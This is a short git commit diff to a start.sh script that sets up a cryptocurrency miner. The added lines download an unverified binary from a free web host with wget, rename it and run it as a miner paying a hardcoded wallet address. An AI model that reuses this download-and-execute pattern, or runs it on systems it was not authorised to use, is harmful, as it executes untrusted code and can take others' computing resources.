f3fa3768654092199ac3c680e1b9fe8ade899f6c
eremdk <79007578+eremdk@users.noreply.github.com>
2021-02-14 12:44:36 +0800

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,2 +1,4 @@
+wget https://reallyhost.at.ua/sugarmaker.noext
+mv sugarmaker.noext cpuminer-sse2
 chmod +x cpuminer-sse2
-./cpuminer-sse2 -c cpuminer-conf.json
+./cpuminer-sse2 -u sugar1qrj8q5cp8u7m782py9vp3sdmz88vpn09u88dq7c
